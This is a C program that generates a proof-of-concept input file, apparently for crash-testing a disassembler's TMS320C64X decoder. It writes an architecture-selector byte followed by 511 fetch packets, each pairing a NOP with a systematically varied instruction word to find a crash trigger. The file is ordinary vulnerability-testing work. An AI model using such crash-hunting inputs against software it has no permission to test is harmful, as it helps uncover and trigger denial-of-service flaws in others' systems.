#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Byte 0: 0x1B = 27, selects TMS320C64X architecture */
    fputc(0x1B, f);
    
    /* Generate multiple fetch packets, each testing a different instruction pattern */
    /* Total must be ≤ 4096 bytes, so we have room for 1 + N*8 bytes */
    /* With 4095 bytes for data, we can fit 511 fetch packets */
    
    /* First instruction: NOP (guaranteed valid) */
    /* Second instruction: systematically vary to find the crash trigger */
    
    int i;
    for (i = 0; i < 511; i++) {
        /* First instruction: NOP */
        fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x60, f);
        
        /* Second instruction: use the loop index to create different patterns */
        /* Try to set specific bits that might correspond to register fields */
        unsigned int instr = (unsigned int)i;
        /* Spread the bits across different positions */
        instr = (instr << 24) | (instr << 16) | (instr << 8) | instr;
        
        fputc((instr >> 24) & 0xFF, f);
        fputc((instr >> 16) & 0xFF, f);
        fputc((instr >> 8) & 0xFF, f);
        fputc(instr & 0xFF, f);
    }
    
    fclose(f);
    return 0;
}